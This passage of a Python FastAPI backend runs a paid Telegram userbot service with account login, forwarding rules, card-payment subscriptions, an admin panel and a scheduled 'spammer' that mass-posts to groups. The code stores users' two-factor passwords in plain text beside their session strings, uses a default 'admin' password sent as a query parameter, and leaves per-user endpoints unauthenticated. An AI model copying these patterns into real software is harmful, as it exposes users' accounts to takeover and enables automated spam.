        subs[uid_str]["phone"] = req.phone
        save_subs(subs)
        
        clients[req.user_id] = c
        register_handler(req.user_id, c)
        del pending[req.phone]
        log.info(f"[{req.user_id}] Akkaunt ulandi: {req.phone}")
        return {"ok": True, "message": "Muvaffaqiyatli ulandi!"}
    except SessionPasswordNeededError:
        return {"ok": False, "need_password": True}
    except PhoneCodeInvalidError:
        raise HTTPException(400, "Noto'g'ri kod")
    except Exception as e:
        raise HTTPException(500, str(e))

@app.post("/auth/verify_password")
async def verify_password(req: PassReq):
    c = None; phone = None
    for ph, pd in pending.items():
        if pd.get("uid") == req.user_id:
            c = pd["client"]; phone = ph; break
    if not c:
        raise HTTPException(400, "Session topilmadi — qaytadan kod oling")
    try:
        await c.sign_in(password=req.password)
        session = c.session.save()
        data = load(req.user_id)
        data.update({"session": session, "connected": True, "2fa_password": req.password})
        save(req.user_id, data)
        clients[req.user_id] = c
        register_handler(req.user_id, c)
        if phone: del pending[phone]
        return {"ok": True}
    except Exception as e:
        raise HTTPException(400, f"Noto'g'ri parol: {e}")

@app.get("/auth/status/{uid}")
async def auth_status(uid: str):
    c = await get_client(uid)
    if c:
        try:
            me = await c.get_me()
            data = load(uid)
            return {
                "connected": True,
                "phone": data.get("phone"),
                "name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
                "username": me.username
            }
        except: pass
    return {"connected": False}

@app.post("/auth/disconnect/{uid}")
async def disconnect_user(uid: str):
    if uid in clients:
        try: await clients[uid].log_out()
        except: pass
        del clients[uid]
    handlers_registered.discard(uid)
    data = load(uid)
    data.update({"session": None, "connected": False})
    save(uid, data)
    return {"ok": True}

# ═══════════════════════════════════════
# CHATS
# ═══════════════════════════════════════
@app.get("/chats/{uid}")
async def get_chats(uid: str, q: str = ""):
    c = await get_client(uid)
    if not c:
        raise HTTPException(401, "Akkaunt ulanmagan")
    chats = []
    try:
        async for dialog in c.iter_dialogs(limit=300):
            name = dialog.name or "Nomsiz"
            if q and q.lower() not in name.lower():
                continue
            ctype = "private"
            if dialog.is_channel: ctype = "channel"
            elif dialog.is_group: ctype = "group"
            chats.append({
                "id": str(dialog.id),
                "name": name,
                "type": ctype,
                "username": getattr(dialog.entity, "username", None),
                "members": getattr(dialog.entity, "participants_count", 0) or 0,
            })
    except Exception as e:
        log.error(f"get_chats: {e}")
    return {"chats": chats}

# ═══════════════════════════════════════
# RULES
# ═══════════════════════════════════════
@app.post("/rules/add")
async def add_rule(req: RuleReq):
    if not check_sub(req.user_id):
        raise HTTPException(status_code=403, detail="Obuna muddati tugagan. Iltimos, obuna sotib oling.")
    data = load(req.user_id)
    rule = {
        "id": datetime.now().strftime("%Y%m%d%H%M%S%f"),
        "source_id": req.source_id,
        "source_name": req.source_name,
        "dest_id": req.dest_id,
        "dest_name": req.dest_name,
        "delivery": req.delivery,
        "fw_type": req.fw_type,
        "links": req.links,
        "active": True, "count": 0,
        "filters": req.filters,
        "settings": req.settings,
        "created": datetime.now().strftime("%d.%m.%Y %H:%M"),
    }
    data["rules"].append(rule)
    save(req.user_id, data)
    return {"ok": True, "rule": rule}

@app.get("/rules/{uid}")
async def get_rules(uid: str):
    return {"rules": load(uid).get("rules", [])}

@app.post("/rules/toggle")
async def toggle_rule(req: RuleAction):
    data = load(req.user_id)
    rules = data.get("rules", [])
    if 0 <= req.rule_index < len(rules):
        rules[req.rule_index]["active"] = not rules[req.rule_index].get("active", True)
        save(req.user_id, data)
        return {"ok": True, "active": rules[req.rule_index]["active"]}
    raise HTTPException(404, "Qoida topilmadi")

@app.post("/rules/delete")
async def delete_rule(req: RuleAction):
    data = load(req.user_id)
    rules = data.get("rules", [])
    if 0 <= req.rule_index < len(rules):
        rules.pop(req.rule_index)
        save(req.user_id, data)
        return {"ok": True}
    raise HTTPException(404, "Qoida topilmadi")

@app.post("/rules/update_setting")
async def update_setting(req: UpdateSetting):
    data = load(req.user_id)
    rules = data.get("rules", [])
    if 0 <= req.rule_index < len(rules):
        if "settings" not in rules[req.rule_index]:
            rules[req.rule_index]["settings"] = {}
        rules[req.rule_index]["settings"][req.key] = req.value
        save(req.user_id, data)
        return {"ok": True}
    raise HTTPException(404, "Qoida topilmadi")

@app.post("/rules/update_filters")
async def update_filters_endpoint(req: UpdateFilters):
    data = load(req.user_id)
    rules = data.get("rules", [])
    if 0 <= req.rule_index < len(rules):
        rules[req.rule_index]["filters"] = req.filters
        save(req.user_id, data)
        return {"ok": True}
    raise HTTPException(404, "Qoida topilmadi")

# Bug fix: renamed from /stats/{uid} to avoid conflict with /stats/{user_id} route below
@app.get("/stats/admin_summary/{uid}")
async def get_stats(uid: str):
    data = load(uid)
    rules = data.get("rules", [])
    return {
        "total": len(rules),
        "active": sum(1 for r in rules if r.get("active", True)),
        "forwarded": sum(r.get("count", 0) for r in rules),
    }

# ═══════════════════════════════════════
# ADMIN ENDPOINTS
# ═══════════════════════════════════════
@app.post("/admin/login")
async def admin_login(req: AdminLogin):
    cfg = load_admin()
    if req.password == cfg.get("password", "admin"):
        return {"ok": True}
    raise HTTPException(403, "Parol noto'g'ri")

@app.get("/admin/stats")
async def admin_stats(password: str = ""):
    cfg = load_admin()
    if password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    subs = load_subs()
    now = datetime.now().timestamp()
    active = sum(1 for s in subs.values() if s.get("expires_at", 0) > now)
    expired = len(subs) - active
    return {
        "total_users": len(subs),
        "active_subs": active,
        "expired_subs": expired,
        "monthly_revenue": cfg.get("total_revenue", 0)
    }

@app.get("/admin/users")
async def admin_users(password: str = ""):
    cfg = load_admin()
    if password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    return load_subs()

@app.post("/admin/users/add_sub")
async def admin_add_sub(uid: str, months: int, password: str = ""):
    cfg = load_admin()
    if password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    subs = load_subs()
    if uid not in subs:
        subs[uid] = {}
    
    user_sub = subs[uid]
    now = datetime.now().timestamp()
    current_exp = user_sub.get("expires_at", now)
    if current_exp < now:
        current_exp = now
        
    if months >= 999:
        user_sub["expires_at"] = now + (100 * 365 * 24 * 3600)
    else:
        user_sub["expires_at"] = current_exp + (months * 30 * 24 * 3600)
        
    user_sub["trial"] = False
    user_sub["reminder_sent"] = False
    subs[uid] = user_sub
    save_subs(subs)
    return {"ok": True}

@app.post("/admin/users/revoke_sub")
async def admin_revoke_sub(uid: str, password: str = ""):
    cfg = load_admin()
    if password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    subs = load_subs()
    if uid not in subs:
        raise HTTPException(404, "Foydalanuvchi topilmadi")
    subs[uid]["expires_at"] = 0
    subs[uid]["trial"] = False
    save_subs(subs)
    return {"ok": True}

@app.post("/admin/users/toggle_stealth")
async def toggle_stealth(uid: str, password: str = ""):
    cfg = load_admin()
    if password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    subs = load_subs()
    if uid not in subs:
        raise HTTPException(404, "Foydalanuvchi topilmadi")
    current = subs[uid].get("stealth_mode", False)
    subs[uid]["stealth_mode"] = not current
    save_subs(subs)
    return {"ok": True, "stealth_mode": not current}

@app.get("/admin/payments")
async def admin_payments(password: str = ""):
    cfg = load_admin()
    if password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    return load_pending()

@app.get("/admin/logs")
async def admin_logs(password: str = ""):
    cfg = load_admin()
    if password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    today = datetime.now().strftime("%Y-%m-%d")
    today_stat = db.stats.find_one({"_id": today})
    forwards_today = today_stat.get("forwards", 0) if today_stat else 0
    
    logs_cursor = db.logs.find().sort("time", -1).limit(50)
    logs = []
    for l in logs_cursor:
        l["_id"] = str(l["_id"])
        logs.append(l)
        
    return {"forwards_today": forwards_today, "logs": logs}

@app.post("/admin/payments/approve")
async def approve_payment(suffix: str, password: str = ""):
    cfg = load_admin()
    if password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    pend = load_pending()
    if suffix not in pend:
        raise HTTPException(404, "Topilmadi")
    p_data = pend.pop(suffix)
    save_pending(pend)
    uid = p_data["user_id"]
    months = p_data["months"]
    subs = load_subs()
    user_sub = subs.get(uid, {})
    now = datetime.now().timestamp()
    current_exp = user_sub.get("expires_at", now)
    if current_exp < now: current_exp = now
    user_sub["expires_at"] = current_exp + (months * 30 * 24 * 3600)
    user_sub["phone"] = p_data.get("phone", user_sub.get("phone", ""))
    user_sub["name"] = p_data.get("name", user_sub.get("name", ""))
    user_sub["username"] = p_data.get("username", user_sub.get("username", ""))
    user_sub["reminder_sent"] = False
    subs[uid] = user_sub
    save_subs(subs)
    
    cfg["total_revenue"] = cfg.get("total_revenue", 0) + (months * cfg.get("monthly_price", 15000))
    save_admin(cfg)
    
    return {"ok": True}

@app.post("/admin/payments/reject")
async def reject_payment(suffix: str, password: str = ""):
    cfg = load_admin()
    if password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    pend = load_pending()
    if suffix in pend:
        pend.pop(suffix)
        save_pending(pend)
    return {"ok": True}

@app.get("/admin/settings")
async def get_admin_settings(password: str = ""):
    cfg = load_admin()
    if password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    return cfg

@app.post("/admin/settings")
async def save_admin_settings(req: AdminSettings, password: str = ""):
    cfg = load_admin()
    if password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    cfg["password"] = req.password
    cfg["channel_id"] = req.channel_id
    cfg["monthly_price"] = req.monthly_price
    cfg["card_number"] = req.card_number
    cfg["card_owner"] = req.card_owner
    # Bug fix: community_link was not being saved
    cfg["community_link"] = req.community_link
    save_admin(cfg)
    return {"ok": True}

# ═══════════════════════════════════════
# SUBSCRIPTION ENDPOINTS
# ═══════════════════════════════════════
import random

@app.get("/sub/status/{uid}")
async def sub_status(uid: str):
    cfg = load_admin()
    price = cfg.get("monthly_price", 15000)
    if uid == "demo_user":
        return {"active": True, "price": price}
    card_number = cfg.get("card_number", "8600 0000 0000 0000")
    card_owner = cfg.get("card_owner", "Admin")
    subs = load_subs()
    user_sub = subs.get(uid)
    if not user_sub:
        # Yangi foydalanuvchi — avtomatik 7 kunlik trial
        now = datetime.now().timestamp()
        user_sub = {"expires_at": now + (7 * 24 * 3600), "trial": True, "registered_at": now}
        subs[uid] = user_sub
        save_subs(subs)
        return {"active": True, "price": price, "expires_at": user_sub["expires_at"], "trial": True, "card_number": card_number, "card_owner": card_owner}
    now = datetime.now().timestamp()
    active = user_sub.get("expires_at", 0) > now
    trial = user_sub.get("trial", False) and active
    return {"active": active, "price": price, "expires_at": user_sub.get("expires_at", 0), "trial": trial, "card_number": card_number, "card_owner": card_owner}

@app.post("/sub/request")
async def sub_request(req: SubRequest):
    cfg = load_admin()
    base_price = cfg.get("monthly_price", 15000)
    total = base_price * req.months
    pend = load_pending()
    # Noyob suffix yaratish (1-99)
    used = set()
    for v in pend.values():
        diff = v.get("amount", 0) - (base_price * v.get("months", 1))
        if 0 < diff < 100:
            used.add(diff)
    suffix = random.randint(1, 99)
    while suffix in used:
        suffix = random.randint(1, 99)
    amount = total + suffix
    suffix_key = str(suffix)
    pend[suffix_key] = {
        "user_id": req.user_id,
        "months": req.months,
        "amount": amount,
        "phone": req.phone,
        "name": req.name,
        "username": req.username,
        "created_at": datetime.now().isoformat()
    }
    save_pending(pend)
    return {"ok": True, "amount": amount, "suffix": suffix, "card_number": cfg.get("card_number"), "card_owner": cfg.get("card_owner")}

# ═══════════════════════════════════════
# USER STATS
# ═══════════════════════════════════════
@app.get("/stats/{uid}")
async def user_stats(uid: str):
    # Bug fix: path param must match the path variable name {uid}
    user_id = uid
    data = load(user_id)
    rules = data.get("rules", [])
    today = datetime.now().strftime("%Y-%m-%d")
    today_stat = db.stats.find_one({"_id": today})
    # Per-user stats saved in db.user_stats
    u_stat = db.user_stats.find_one({"_id": user_id}) or {}
    
    rule_stats = []
    total_count = 0
    top_rule = None
    top_count = 0
    for i, r in enumerate(rules):
        cnt = r.get("count", 0)
        total_count += cnt
        rule_stats.append({"name": r.get("name", f"Qoida #{i+1}"), "count": cnt, "active": r.get("active", True)})
        if cnt > top_count:
            top_count = cnt
            top_rule = r.get("name", f"Qoida #{i+1}")
    
    return {
        "total_forwarded": total_count,
        "today_forwarded": u_stat.get("today_forwards", 0),
        "top_rule": top_rule,
        "rules": rule_stats
    }

# ═══════════════════════════════════════
# REFERRAL
# ═══════════════════════════════════════
@app.get("/referral/info")
async def referral_info(user_id: str):
    subs = load_subs()
    u = subs.get(user_id, {})
    ref_code = u.get("ref_code") or get_ref_code(user_id)
    # Ensure ref_code is saved
    if not u.get("ref_code"):
        subs[user_id]["ref_code"] = ref_code
        save_subs(subs)
    bot_username = (await ptb_app.bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start={ref_code}"
    return {
        "ref_code": ref_code,
        "ref_link": ref_link,
        "referrals_count": len(u.get("referrals", [])),
        "bonus_days": u.get("ref_bonus_days", 0)
    }

@app.get("/health")
async def health():
    return {"status": "ok", "clients": len(clients), "pending": len(pending)}


# ═══════════════════════════════════════
# SPAMMER LOOP (background)
# ═══════════════════════════════════════
async def spammer_loop():
    """Har 60 soniyada vaqti kelgan spammer yozuvlarini tekshirib xabar yuboradi"""
    await asyncio.sleep(10)  # Startup uchun kutamiz
    while True:
        try:
            now = datetime.now().timestamp()
            docs = list(db.spammer.find({"active": True}))
            for doc in docs:
                uid = doc["uid"]
                last = doc.get("last_sent", 0)
                interval = doc.get("interval_sec", 1800)
                if now - last >= interval:
                    client = await get_client(uid)
                    if not client:
                        continue
                    text = doc.get("text", "")
                    targets = doc.get("targets", [])
                    sid = doc["_id"]
                    sent = 0
                    for target in targets:
                        try:
                            dest = int(target) if str(target).lstrip("-").isdigit() else target
                            photo_path = doc.get("photo_path")
                            if photo_path and os.path.exists(photo_path):
                                await client.send_file(dest, photo_path, caption=text)
                            else:
                                await client.send_message(dest, text)
                            sent += 1
                            await asyncio.sleep(3)  # Guruhlar orasida kutamiz
                        except FloodWaitError as e:
                            log_error(uid, f"Spammer FloodWait {e.seconds}s: {target}")
                            await asyncio.sleep(e.seconds + 5)
                        except Exception as e:
                            log_error(uid, f"Spammer xato ({target}): {e}")
                    db.spammer.update_one({"_id": sid}, {"$set": {"last_sent": now}})
                    if sent > 0:
                        log.info(f"[{uid}] Spammer: {sent} ta guruhga xabar yuborildi")
                        # Notify: foydalanuvchiga bildirishnoma
                        try:
                            cfg = load_admin()
                            await ptb_app.bot.send_message(
                                chat_id=int(uid),
                                text=f"📬 Xabar tarqatish: {sent} ta guruhga muvaffaqiyatli yuborildi."
                            )
                        except Exception:
                            pass
        except Exception as e:
            log.error(f"spammer_loop error: {e}")
        await asyncio.sleep(60)

# ═══════════════════════════════════════
# BROADCAST (Admin)
# ═══════════════════════════════════════
class BroadcastReq(BaseModel):
    password: str
    text: str
    target: str = "all"  # "all" or "active"

@app.post("/admin/broadcast")
async def admin_broadcast(req: BroadcastReq):
    cfg = load_admin()
    if req.password != cfg.get("password", "admin"):
        raise HTTPException(403, "Ruxsat yo'q")
    subs = load_subs()
    now = datetime.now().timestamp()
    sent = 0
    failed = 0
    for uid, sub_data in subs.items():
        if req.target == "active":
            exp = sub_data.get("expires_at", 0)
            if not (exp and exp > now):
                continue
        try:
            await ptb_app.bot.send_message(chat_id=int(uid), text=req.text)
            sent += 1
            await asyncio.sleep(0.4)
        except Exception as e:
            failed += 1
            log.warning(f"Broadcast failed for {uid}: {e}")
    return {"ok": True, "sent": sent, "failed": failed}

# ═══════════════════════════════════════
# SPAMMER CRUD (User)
# ═══════════════════════════════════════
MIN_INTERVAL = 1800  # 30 daqiqa

class SpammerCreateReq(BaseModel):
    user_id: str
    text: str
    targets: list
    interval_sec: int

@app.post("/spammer/create")
async def spammer_create(
    user_id: str = Form(...),
    text: str = Form(...),
    targets: str = Form(...),
    interval_sec: int = Form(...),
    photo: UploadFile = File(None)
):
    target_list = json.loads(targets)
    if interval_sec < MIN_INTERVAL:
        raise HTTPException(400, f"Minimum interval {MIN_INTERVAL} soniya (30 daqiqa)")
    if not text.strip() and not photo:
        raise HTTPException(400, "Xabar matni yoki rasm kiritilishi shart")
    if not target_list:
        raise HTTPException(400, "Kamida 1 ta guruh/kanal kiriting")
    
    photo_path = None
    if photo and photo.filename:
        ext = photo.filename.split('.')[-1] if '.' in photo.filename else 'jpg'
        os.makedirs("data/spammer_media", exist_ok=True)
        photo_path = f"data/spammer_media/{uuid.uuid4().hex}.{ext}"
        with open(photo_path, "wb") as f:
            shutil.copyfileobj(photo.file, f)

    doc = {
        "uid": user_id,
        "text": text,
        "targets": target_list,
        "interval_sec": interval_sec,
        "photo_path": photo_path,
        "last_sent": 0,
        "active": True,
        "created_at": datetime.now().timestamp()
    }
    result = db.spammer.insert_one(doc)
    return {"ok": True, "id": str(result.inserted_id)}

@app.get("/spammer/list")
async def spammer_list(user_id: str):
    docs = list(db.spammer.find({"uid": user_id}))
    for d in docs:
        d["_id"] = str(d["_id"])
    return docs

@app.post("/spammer/toggle")
async def spammer_toggle(id: str, user_id: str):
    from bson import ObjectId
    doc = db.spammer.find_one({"_id": ObjectId(id), "uid": user_id})
    if not doc:
        raise HTTPException(404, "Topilmadi")
    new_state = not doc.get("active", True)
    db.spammer.update_one({"_id": ObjectId(id)}, {"$set": {"active": new_state}})
    return {"ok": True, "active": new_state}

@app.delete("/spammer/delete")
async def spammer_delete(id: str, user_id: str):
    from bson import ObjectId
    doc = db.spammer.find_one({"_id": ObjectId(id), "uid": user_id})
    if not doc:
        raise HTTPException(404, "Topilmadi")
    if doc.get("photo_path") and os.path.exists(doc["photo_path"]):
        try: os.remove(doc["photo_path"])
        except: pass
    result = db.spammer.delete_one({"_id": ObjectId(id), "uid": user_id})
    return {"ok": True}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
